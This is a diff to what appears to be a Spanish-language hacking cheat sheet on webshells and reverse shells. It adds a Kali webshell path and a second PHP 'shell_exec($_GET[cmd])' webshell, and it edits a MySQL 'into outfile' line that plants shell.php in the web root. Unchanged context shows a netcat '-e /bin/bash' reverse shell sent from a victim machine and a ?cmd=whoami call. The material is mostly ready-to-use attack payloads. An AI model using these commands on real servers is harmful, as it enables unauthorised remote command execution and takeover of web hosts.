@@ -15,6 +15,12 @@ Tenemos diferentes tipos de Revershell este pagina Web:
 
 La mayoría de las paginas al momento de comprometerlas encontraremos el usuario **www-data** que es el encargado de gestionar la parte de servicios web.
 
+## Webshell/ReverseShell en Kali
+
+```bash 
+❯ ls -al /usr/share/webshells/               # En esa ruta tenemos diferetes Revershell o Webshells
+```
+
 ## Netcat
 
 ```bash 
@@ -36,7 +42,7 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 ```bash 
 # Debemos estar dentro del servicio de MySQL
 
-❯ select '<?php  $output=shell_exec($_GET["cmd"]);echo "<prep>".$output."</prep>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1; 
+❯ select '<?php  $output=shell_exec($_GET["cmd"]);echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1; 
 
 # Ahora en la URL podemos ejecutar comandos 
 ❯ shell.php?cmd=whoami            
@@ -71,7 +77,8 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 ❯ nc -nv <IP> 443 -e /bin/bash                     # Completar la Reverse shell desde una maquina victima Linux
 ```
 
-**Bind Shell:**
+## Bind Shell:
+
 ```bash
 # Desde la terminal del SO
 
@@ -110,6 +117,13 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 	?>
 
 # Las etiquetas que usamos ahí son 'Pre' de preformateadas y nos sirven para que nos muestre bien el Output. Ya con ese archivo y que la Web interprete 'php' podemos colocar en la url (?cmd=) para colocar comandos y ver que Shell podriamos usar para conectarmos a nuestra maquina de 'Atacante'
+
+# Otra manera 
+	<?php 
+		$output = shell_exec($_GET["cmd"]);
+		echo "<pre>$output</pre>";
+	?>
+
 ```
 
 ```bash
